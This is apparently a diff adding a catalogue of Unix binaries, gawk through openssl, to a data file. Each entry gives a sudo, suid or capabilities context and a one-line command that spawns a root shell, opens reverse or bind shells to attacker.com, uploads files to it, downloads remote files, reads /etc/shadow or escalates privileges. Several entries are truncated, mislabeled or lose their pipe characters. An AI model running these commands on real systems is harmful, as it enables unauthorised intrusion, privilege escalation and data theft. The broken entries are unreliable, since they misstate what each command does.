+gawk|suid|bind-shell|./gawk 'BEGIN {
+gawk|suid|file-write|./gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+gawk|suid|file-read|./gawk '//' /path/to/input-file
+gcc|sudo|shell|sudo gcc -wrapper /bin/sh,-s x
+gcc|sudo|file-write|sudo gcc -x c /dev/null -o /path/to/input-file
+gcc|sudo|file-read|sudo gcc -x c -E /path/to/input-file
+gcc|sudo|file-read|sudo gcc @/path/to/input-file
+gcloud|sudo|inherit|sudo gcloud help
+gcloud|suid|inherit|./gcloud help
+gcore|sudo|file-read|sudo gcore $PID
+gcore|suid|file-read|./gcore $PID
+gdb|sudo|shell|sudo gdb -nx -ex '!/bin/sh' -ex quit
+gdb|sudo|file-write|sudo gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
+gdb|sudo|inherit|sudo gdb -nx -ex 'python ...' -ex quit
+gdb|suid|shell|./gdb -nx -ex '!/bin/sh' -ex quit
+gdb|suid|file-write|./gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
+gdb|suid|inherit|./gdb -nx -ex 'python ...' -ex quit
+gdb|capabilities|shell|gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
+gem|sudo|shell|sudo gem open -e '/bin/sh -s' debug
+gem|sudo|inherit|sudo gem build /path/to/script.rb
+gem|sudo|inherit|sudo gem install --file /path/to/script.rb
+gem|sudo|inherit|sudo gem open debug
+genie|sudo|shell|sudo genie -c '/bin/sh'
+genie|suid|shell|./genie -c '/bin/sh'
+genisoimage|sudo|file-read|sudo genisoimage -q -o - /path/to/input-file
+genisoimage|sudo|file-read|sudo genisoimage -sort /path/to/input-file
+genisoimage|suid|file-read|./genisoimage -q -o - /path/to/input-file
+genisoimage|suid|file-read|./genisoimage -sort /path/to/input-file
+getent|sudo|privilege-escalation|sudo getent shadow
+getent|suid|privilege-escalation|./getent shadow
+ghc|sudo|shell|sudo ghc -e 'System.Process.callCommand "/bin/sh"'
+ghci|sudo|shell|sudo ghci
+gimp|sudo|inherit|sudo gimp -idf --batch-interpreter=python-fu-eval -b '...'
+ginsh|sudo|shell|sudo ginsh
+ginsh|suid|shell|./ginsh
+git|sudo|shell|sudo PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
+git|sudo|shell|sudo git init .
+git|sudo|shell|sudo ln -s /bin/sh git-x
+git|sudo|file-write|sudo git apply --unsafe-paths --directory / x.patch
+git|sudo|file-read|sudo git diff /dev/null /path/to/input-file
+git|sudo|inherit|sudo git branch --help config
+git|sudo|inherit|sudo git help config
+git|suid|shell|ln -s /bin/sh git-x git --exec-path=. x -p
+git|suid|file-write|./git apply --unsafe-paths --directory / x.patch
+git|suid|file-read|./git diff /dev/null /path/to/input-file
+gnuplot|sudo|shell|sudo gnuplot -e 'system("/bin/sh 1>&0")'
+gnuplot|suid|shell|./gnuplot -e 'system("/bin/sh 1>&0")'
+go|sudo|shell|sudo echo -e 'package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\n}' >/path/to/temp-file.go
+go|sudo|reverse-shell|sudo echo -e 'package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("attacker.com").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-file.go
+go|sudo|bind-shell|sudo echo -e 'package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-file.go
+go|sudo|file-write|sudo echo -e 'package main\nimport "os"\nfunc main(){\n\tf, _ := os.OpenFile("/path/to/output-file", os.O_RDWR os.O_CREATE, 0644)\n\tf.Write([]byte("DATA\\n"))\n\tf.Close()\n}' >/path/to/temp-file.go
+go|sudo|file-read|sudo echo -e 'package main\nimport (\n\t"fmt"\n\t"os"\n)\n\nfunc main(){\n\tb, _ := os.ReadFile("/path/to/input-file")\n\tfmt.Print(string(b))\n}' >/path/to/temp-file.go
+grc|sudo|shell|sudo grc --pty /bin/sh
+grep|sudo|file-read|sudo grep '' /path/to/input-file
+grep|suid|file-read|./grep '' /path/to/input-file
+gtester|sudo|shell|sudo echo 'exec /bin/sh 0<&1' >/path/to/temp-file
+gtester|sudo|file-write|sudo gtester DATA -o /path/to/output-file
+gtester|suid|shell|echo '#!/bin/sh -p' >/path/to/temp-file echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file chmod +x /path/to/temp-file gtester -q /path/to/temp-file
+gtester|suid|file-write|./gtester DATA -o /path/to/output-file
+guile|sudo|shell|sudo guile -c '(system "/bin/sh")'
+guile|suid|shell|./guile -c '(system "/bin/sh")'
+gzip|sudo|file-read|sudo gzip -c /path/to/input-file   gzip -d
+gzip|suid|file-read|./gzip -c /path/to/input-file   gzip -d
+gzip|capabilities|file-read|gzip -c /path/to/input-file   gzip -d
+hashcat|sudo|file-write|sudo echo -n DATA   tee /path/to/wordlist   md5sum   awk '{print $1}' >/path/to/hash
+hd|sudo|file-read|sudo hd /path/to/input-file
+hd|suid|file-read|./hd /path/to/input-file
+head|sudo|file-read|sudo head -c-0 /path/to/input-file
+head|suid|file-read|./head -c-0 /path/to/input-file
+hexdump|sudo|file-read|sudo hd /path/to/input-file
+hexdump|suid|file-read|./hd /path/to/input-file
+hg|sudo|shell|sudo hg --config alias.x='!/bin/sh' x
+hg|suid|shell|./hg --config alias.x='!/bin/sh' x
+highlight|sudo|file-read|sudo highlight --no-doc --failsafe /path/to/input-file
+highlight|suid|file-read|./highlight --no-doc --failsafe /path/to/input-file
+hping3|sudo|shell|sudo hping3
+hping3|sudo|upload|sudo hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file
+hping3|suid|shell|hping3 /bin/sh -p
+iconv|sudo|file-write|sudo echo DATA   iconv -f 8859_1 -t 8859_1 -o /path/to/output-file
+iconv|sudo|file-read|sudo iconv -f 8859_1 -t 8859_1 /path/to/input-file
+iconv|suid|file-write|./echo DATA   iconv -f 8859_1 -t 8859_1 -o /path/to/output-file
+iconv|suid|file-read|./iconv -f 8859_1 -t 8859_1 /path/to/input-file
+iftop|sudo|shell|sudo iftop
+iftop|suid|shell|./iftop
+install|sudo|privilege-escalation|sudo install -m 6777 /path/to/input-file /path/to/output-dir/
+install|suid|privilege-escalation|./install -m 6777 /path/to/input-file /path/to/output-dir/
+ionice|sudo|shell|sudo ionice /bin/sh
+ionice|suid|shell|ionice /bin/sh -p
+ip|sudo|shell|sudo ip netns add foo
+ip|sudo|file-read|sudo ip -force -batch /path/to/input-file
+ip|suid|shell|ip netns add foo ip netns exec foo /bin/sh -p ip netns delete foo
+ip|suid|file-read|./ip -force -batch /path/to/input-file
+iptables-save|sudo|file-write|sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
+irb|sudo|inherit|sudo irb
+ispell|sudo|shell|sudo ispell /etc/hosts
+ispell|suid|shell|ispell /etc/hosts !/bin/sh -p
+java|sudo|shell|sudo java Shell
+jjs|sudo|download|sudo jjs
+joe|sudo|shell|sudo joe
+joe|suid|shell|./joe
+join|sudo|file-read|sudo join -a 2 /dev/null /path/to/input-file
+join|suid|file-read|./join -a 2 /dev/null /path/to/input-file
+journalctl|sudo|inherit|sudo journalctl
+jq|sudo|file-read|sudo jq -Rr . /path/to/input-file
+jq|suid|file-read|./jq -Rr . /path/to/input-file
+jrunscript|sudo|shell|sudo jrunscript -e 'exec("/bin/sh -c $@ sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'
+jrunscript|sudo|reverse-shell|sudo jrunscript -e 'var host="attacker.com";
+jrunscript|sudo|file-write|sudo jrunscript -e 'var fw=new java.io.FileWriter("/path/to/output-file");
+jrunscript|sudo|file-read|sudo jrunscript -e 'br = new BufferedReader(new java.io.FileReader("/path/to/input-file"));
+jrunscript|sudo|download|sudo jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
+jrunscript|suid|shell|jrunscript -e 'exec("/bin/sh -pc $@ sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'
+jshell|sudo|file-read|sudo jshell
+jtag|sudo|shell|sudo jtag --interactive
+julia|sudo|shell|sudo julia -e 'run(`/bin/sh`)'
+julia|sudo|reverse-shell|sudo julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+julia|sudo|file-write|sudo julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
+julia|sudo|file-read|sudo julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
+julia|sudo|download|sudo julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+julia|suid|shell|julia -e 'run(`/bin/sh -p`)'
+julia|suid|reverse-shell|./julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+julia|suid|file-write|./julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
+julia|suid|file-read|./julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
+julia|suid|download|./julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+knife|sudo|inherit|sudo knife exec -E '...'
+ksh|sudo|shell|sudo bash
+ksh|sudo|reverse-shell|sudo bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
+ksh|sudo|file-write|sudo HISTIGNORE='history *'
+ksh|sudo|file-write|sudo bash -c 'echo DATA >/path/to/output-file'
+ksh|sudo|file-read|sudo HISTTIMEFORMAT=$'\r\e[K'
+ksh|sudo|file-read|sudo bash -c 'echo "$(</path/to/input-file)"'
+ksh|sudo|upload|sudo bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+ksh|sudo|upload|sudo bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+ksh|suid|shell|bash -p
+ksh|suid|reverse-shell|bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
+ksh|suid|file-write|./HISTIGNORE='history *'
+ksh|suid|file-write|bash -p -c 'echo DATA >/path/to/output-file'
+ksh|suid|file-read|./HISTTIMEFORMAT=$'\r\e[K'
+ksh|suid|file-read|bash -p -c 'echo "$(</path/to/input-file)"'
+ksh|suid|upload|bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+ksh|suid|upload|bash -p -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+ksshell|sudo|file-read|sudo ksshell -i /path/to/input-file
+ksshell|suid|file-read|./ksshell -i /path/to/input-file
+ksu|sudo|shell|sudo ksu -q -e /bin/sh
+kubectl|sudo|shell|sudo cat >/path/to/temp-file <<EOF
+kubectl|sudo|upload|sudo kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
+kubectl|suid|upload|./kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
+last|sudo|file-read|sudo last -a -f /path/to/input-file
+last|suid|file-read|./last -a -f /path/to/input-file
+lastb|sudo|file-read|sudo last -a -f /path/to/input-file
+lastb|suid|file-read|./last -a -f /path/to/input-file
+latex|sudo|shell|sudo latex --shell-escape '\immediate\write18{/bin/sh}'
+latex|sudo|file-write|sudo latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+latex|sudo|file-read|sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+latex|suid|shell|./latex --shell-escape '\immediate\write18{/bin/sh}'
+latex|suid|file-write|./latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+latex|suid|file-read|./latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+latexmk|sudo|shell|sudo latexmk -pdf -pdflatex='/bin/sh #' /dev/null
+latexmk|sudo|file-read|sudo echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
+latexmk|sudo|inherit|sudo latexmk -e '...'
+ld.so|sudo|shell|sudo /path/to/ld.so /bin/sh
+ld.so|suid|shell|/path/to/ld.so /bin/sh -p
+ldconfig|sudo|library-load|sudo echo /path/to/temp-dir/ >/path/to/temp-file
+ldconfig|suid|library-load|./echo /path/to/temp-dir/ >/path/to/temp-file
+less|sudo|shell|sudo LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
+less|sudo|shell|sudo VISUAL='/bin/sh -s --' less /etc/hosts
+less|sudo|command|sudo LESSOPEN='/path/to/command # %s' less /etc/hosts
+less|sudo|file-write|sudo echo DATA   less
+less|sudo|file-read|sudo LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts
+less|sudo|file-read|sudo less /etc/hosts
+less|sudo|file-read|sudo less /path/to/input-file
+less|suid|file-write|./echo DATA   less
+less|suid|file-read|./less /etc/hosts
+less|suid|file-read|./less /path/to/input-file
+lftp|sudo|shell|sudo lftp -c '!/bin/sh'
+lftp|suid|shell|./lftp -c '!/bin/sh'
+links|sudo|file-read|sudo links /path/to/input-file
+links|suid|file-read|./links /path/to/input-file
+ln|sudo|privilege-escalation|sudo ln -fs /bin/sh /bin/ln
+loginctl|sudo|shell|sudo loginctl user-status
+logrotate|sudo|shell|sudo echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config
+logrotate|sudo|file-write|sudo logrotate -l /path/to/output-file DATA
+logrotate|sudo|file-read|sudo logrotate /path/to/input-file
+logrotate|suid|file-write|./logrotate -l /path/to/output-file DATA
+logrotate|suid|file-read|./logrotate /path/to/input-file
+logsave|sudo|shell|sudo logsave /dev/null /bin/sh -i
+logsave|suid|shell|logsave /dev/null /bin/sh -i -p
+look|sudo|file-read|sudo look '' /path/to/input-file
+look|suid|file-read|./look '' /path/to/input-file
+lp|sudo|upload|sudo lp /path/to/input-file -h attacker.com
+lp|suid|upload|./lp /path/to/input-file -h attacker.com
+ltrace|sudo|shell|sudo ltrace -b -L /bin/sh
+ltrace|sudo|file-write|sudo ltrace -s 999 -o /path/to/input-file ltrace -F DATA
+ltrace|sudo|file-read|sudo ltrace -F /path/to/input-file /dev/null
+ltrace|suid|file-read|./ltrace -F /path/to/input-file /dev/null
+lua|sudo|shell|sudo lua -e 'os.execute("/bin/sh")'
+lua|sudo|bind-shell|sudo lua -e '
+lua|sudo|file-write|sudo lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
+lua|sudo|file-read|sudo lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
+lua|suid|shell|./lua -e 'os.execute("/bin/sh")'
+lua|suid|bind-shell|./lua -e '
+lua|suid|file-write|./lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
+lua|suid|file-read|./lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
+lualatex|sudo|inherit|sudo lualatex -shell-escape '\directlua{...}\end'
+lualatex|suid|inherit|./lualatex -shell-escape '\directlua{...}\end'
+luatex|sudo|inherit|sudo luatex -shell-escape '\directlua{...}\end'
+luatex|suid|inherit|./luatex -shell-escape '\directlua{...}\end'
+lwp-download|sudo|file-write|sudo echo DATA >/path/to/temp-file
+lwp-download|sudo|file-write|sudo lwp-download file:///path/to/input-file /path/to/output-file
+lwp-download|sudo|file-read|sudo lwp-download file:///path/to/input-file /dev/stdout
+lwp-download|sudo|download|sudo lwp-download http://attacker.com/path/to/input-file /path/to/output-file
+lwp-request|sudo|file-read|sudo lwp-request file:///path/to/input-file
+lxd|sudo|shell|sudo lxc image import ./alpine*.tar.gz --alias x
+lxd|sudo|shell|sudo lxc init ubuntu:16.04 x -c security.privileged=true
+lxd|suid|shell|./lxc image import ./alpine*.tar.gz --alias x
+lxd|suid|shell|./lxc init ubuntu:16.04 x -c security.privileged=true
+m4|sudo|shell|sudo echo 'esyscmd(/bin/sh 0<&2 1>&2)'   m4
+m4|sudo|command|sudo echo 'esyscmd(/path/to/command)'   m4
+m4|sudo|file-read|sudo m4 /path/to/input-file
+m4|suid|shell|./echo 'esyscmd(/bin/sh 0<&2 1>&2)'   m4
+m4|suid|command|./echo 'esyscmd(/path/to/command)'   m4
+m4|suid|file-read|./m4 /path/to/input-file
+mail|sudo|shell|sudo mail --exec='!/bin/sh'
+mail|sudo|shell|sudo mail -f /etc/hosts
+mail|suid|shell|./mail --exec='!/bin/sh'
+mail|suid|shell|./mail -f /etc/hosts
+make|sudo|shell|sudo make --eval='$(shell /bin/sh 1>&0)' .
+make|sudo|file-write|sudo make -s --eval='$(file >/path/to/output-file,DATA)' .
+make|sudo|file-read|sudo make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
+make|suid|shell|./make --eval='$(shell /bin/sh 1>&0)' .
+make|suid|file-write|./make -s --eval='$(file >/path/to/output-file,DATA)' .
+make|suid|file-read|./make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
+man|sudo|shell|sudo man '-H/bin/sh #' man
+man|sudo|file-read|sudo man /path/to/input-file
+man|sudo|inherit|sudo man man
+man|suid|shell|./man '-H/bin/sh #' man
+man|suid|file-read|./man /path/to/input-file
+man|suid|inherit|./man man
+mawk|sudo|shell|sudo mawk 'BEGIN {system("/bin/sh")}'
+mawk|sudo|file-write|sudo mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+mawk|sudo|file-read|sudo mawk '//' /path/to/input-file
+mawk|suid|shell|./mawk 'BEGIN {system("/bin/sh")}'
+mawk|suid|file-write|./mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+mawk|suid|file-read|./mawk '//' /path/to/input-file
+minicom|sudo|shell|sudo echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
+minicom|sudo|shell|sudo minicom -D /dev/null
+minicom|suid|shell|./echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
+minicom|suid|shell|./minicom -D /dev/null
+more|sudo|shell|sudo more /etc/hosts
+more|sudo|file-read|sudo more /path/to/input-file
+more|suid|shell|./more /etc/hosts
+more|suid|file-read|./more /path/to/input-file
+mosh-server|sudo|shell|sudo mosh --server=mosh-server localhost /bin/sh
+mosquitto|sudo|file-read|sudo mosquitto -c /path/to/input-file
+mosquitto|suid|file-read|./mosquitto -c /path/to/input-file
+mount|sudo|privilege-escalation|sudo mount -o bind /bin/sh /bin/mount
+msfconsole|sudo|inherit|sudo msfconsole
+msgattrib|sudo|file-read|sudo msgattrib -P /path/to/input-file
+msgattrib|suid|file-read|./msgattrib -P /path/to/input-file
+msgcat|sudo|file-read|sudo msgcat -P /path/to/input-file
+msgcat|suid|file-read|./msgcat -P /path/to/input-file
+msgconv|sudo|file-read|sudo msgconv -P /path/to/input-file
+msgconv|suid|file-read|./msgconv -P /path/to/input-file
+msgfilter|sudo|shell|sudo echo x   msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+msgfilter|sudo|file-read|sudo msgfilter -P -i /path/to/input-file /bin/cat
+msgfilter|suid|shell|echo x   msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
+msgfilter|suid|file-read|./msgfilter -P -i /path/to/input-file /bin/cat
+msgmerge|sudo|file-read|sudo msgmerge -P /path/to/input-file /dev/null
+msgmerge|suid|file-read|./msgmerge -P /path/to/input-file /dev/null
+msguniq|sudo|file-read|sudo msguniq -P /path/to/input-file
+msguniq|suid|file-read|./msguniq -P /path/to/input-file
+mtr|sudo|file-read|sudo mtr --raw -F /path/to/input-file
+multitime|sudo|shell|sudo multitime /bin/sh
+multitime|suid|shell|multitime /bin/sh -p
+mutt|sudo|file-read|sudo mutt -F /path/to/input-file
+mv|sudo|privilege-escalation|sudo mv /path/to/input-file /path/to/output-file
+mv|sudo|file-write|sudo echo DATA >/path/to/temp-file
+mv|suid|privilege-escalation|./mv /path/to/input-file /path/to/output-file
+mv|suid|file-write|./echo DATA >/path/to/temp-file
+mypy|sudo|file-write|sudo mypy /path/to/input-file --junit-xml /path/to/output-file
+mypy|sudo|file-read|sudo mypy /path/to/input-file
+mysql|sudo|shell|sudo mysql -e '\! /bin/sh'
+mysql|sudo|library-load|sudo mysql --default-auth ../../../../../path/to/lib
+mysql|suid|shell|./mysql -e '\! /bin/sh'
+mysql|suid|library-load|./mysql --default-auth ../../../../../path/to/lib
+nano|sudo|shell|sudo nano
+nano|sudo|shell|sudo nano -s /bin/sh
+nano|sudo|file-write|sudo nano /path/to/output-file
+nano|sudo|file-read|sudo nano /path/to/input-file
+nano|suid|shell|./nano
+nano|suid|shell|nano -s '/bin/sh -p' /bin/sh -p ^T^T
+nano|suid|file-write|./nano /path/to/output-file
+nano|suid|file-read|./nano /path/to/input-file
+nasm|sudo|file-read|sudo nasm -@ /path/to/input-file
+nasm|suid|file-read|./nasm -@ /path/to/input-file
+nawk|sudo|shell|sudo gawk 'BEGIN {system("/bin/sh")}'
+nawk|sudo|bind-shell|sudo gawk 'BEGIN {
+nawk|sudo|file-write|sudo gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+nawk|sudo|file-read|sudo gawk '//' /path/to/input-file
+nawk|suid|shell|./gawk 'BEGIN {system("/bin/sh")}'
+nawk|suid|bind-shell|./gawk 'BEGIN {
+nawk|suid|file-write|./gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+nawk|suid|file-read|./gawk '//' /path/to/input-file
+nc|sudo|reverse-shell|sudo nc -e /bin/sh attacker.com 12345
+nc|sudo|bind-shell|sudo nc -l -p 12345 -e /bin/sh
+nc|sudo|upload|sudo nc -l -p 12345 </path/to/input-file
+nc|sudo|upload|sudo nc attacker.com 12345 </path/to/input-file
+nc|sudo|download|sudo nc -l -p 12345 >/path/to/output-file
+nc|sudo|download|sudo nc attacker.com 12345 >/path/to/output-file
+nc|suid|reverse-shell|./nc -e /bin/sh attacker.com 12345
+nc|suid|bind-shell|./nc -l -p 12345 -e /bin/sh
+nc|suid|upload|./nc -l -p 12345 </path/to/input-file
+nc|suid|upload|./nc attacker.com 12345 </path/to/input-file
+nc|suid|download|./nc -l -p 12345 >/path/to/output-file
+nc|suid|download|./nc attacker.com 12345 >/path/to/output-file
+ncdu|sudo|shell|sudo ncdu
+ncdu|suid|shell|./ncdu
+ncftp|sudo|shell|sudo ncftp
+ncftp|suid|shell|ncftp !/bin/sh -p
+needrestart|sudo|inherit|sudo echo '...' >/path/to/temp-file
+neofetch|sudo|shell|sudo echo 'exec /bin/sh' >/path/to/temp-file
+neofetch|sudo|file-read|sudo neofetch --ascii /path/to/input-file
+nft|sudo|file-read|sudo nft -f /path/to/input-file
+nginx|sudo|download|sudo cat >/path/to/temp-file <<EOF
+nginx|suid|library-load|./cat >/path/to/temp-file <<EOF
+nice|sudo|shell|sudo nice /bin/sh
+nice|suid|shell|nice /bin/sh -p
+nl|sudo|file-read|sudo nl -bn -w1 -s '' /path/to/input-file
+nl|suid|file-read|./nl -bn -w1 -s '' /path/to/input-file
+nm|sudo|file-read|sudo nm /path/to/input-file
+nm|suid|file-read|./nm /path/to/input-file
+nmap|sudo|shell|sudo nmap --interactive
+nmap|sudo|file-write|sudo nmap -oG=/path/to/output-file DATA
+nmap|sudo|file-read|sudo nmap -iL /path/to/input-file
+nmap|sudo|inherit|sudo echo '...' >/path/to/temp-file
+nmap|suid|shell|./nmap --interactive
+nmap|suid|file-write|./nmap -oG=/path/to/output-file DATA
+nmap|suid|file-read|./nmap -iL /path/to/input-file
+nmap|suid|inherit|./echo '...' >/path/to/temp-file
+node|sudo|shell|sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+node|sudo|bind-shell|sudo node -e 'sh = require("child_process").spawn("/bin/sh");
+node|sudo|file-write|sudo node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
+node|sudo|file-read|sudo node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
+node|sudo|upload|sudo node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
+node|sudo|download|sudo node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
+node|suid|shell|node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
+node|suid|reverse-shell|node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]); require("net").connect(12345, "attacker.com", function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'
+node|suid|bind-shell|node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]); require("net").createServer(function (client) { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }).listen(12345)'
+node|suid|file-write|./node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
+node|suid|file-read|./node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
+node|suid|upload|./node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
+node|suid|download|./node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
+node|capabilities|shell|node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+nohup|sudo|shell|sudo nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'
+nohup|sudo|command|sudo nohup /path/to/command
+nohup|suid|shell|nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
+nohup|suid|command|./nohup /path/to/command
+npm|sudo|shell|sudo echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
+npm|sudo|shell|sudo echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
+npm|sudo|shell|sudo npm exec /bin/sh
+nroff|sudo|shell|sudo echo /bin/sh >groff
+nroff|sudo|file-read|sudo nroff /path/to/input-file
+nsenter|sudo|shell|sudo nsenter /bin/sh
+nsenter|suid|shell|nsenter /bin/sh -p
+ntpdate|sudo|file-read|sudo ntpdate -a x -k /path/to/input-file -d localhost
+ntpdate|suid|file-read|./ntpdate -a x -k /path/to/input-file -d localhost
+nvim|sudo|file-read|sudo vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+nvim|sudo|inherit|sudo vim
+nvim|sudo|inherit|sudo vim -c ':lua ...'
+nvim|sudo|inherit|sudo vim -c ':py ...'
+nvim|suid|file-read|./vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+nvim|suid|inherit|./vim
+nvim|suid|inherit|./vim -c ':lua ...'
+nvim|suid|inherit|./vim -c ':py ...'
+octave|sudo|shell|sudo octave-cli --eval 'system("/bin/sh")'
+octave|sudo|file-write|sudo octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
+octave|sudo|file-read|sudo octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
+octave|suid|shell|./octave-cli --eval 'system("/bin/sh")'
+octave|suid|file-write|./octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
+octave|suid|file-read|./octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
+od|sudo|file-read|sudo od -An -c -w999 /path/to/input-file
+od|suid|file-read|./od -An -c -w999 /path/to/input-file
+opencode|sudo|command|sudo opencode
+opencode|sudo|inherit|sudo opencode db '...'
+opencode|suid|command|./opencode
+openssl|sudo|reverse-shell|sudo mkfifo /path/to/temp-socket
+openssl|sudo|file-write|sudo echo DATA   openssl enc -out /path/to/output-file
+openssl|sudo|file-write|sudo openssl enc -in /path/to/input-file -out /path/to/output-file
+openssl|sudo|file-read|sudo openssl enc -in /path/to/input-file
+openssl|sudo|upload|sudo openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
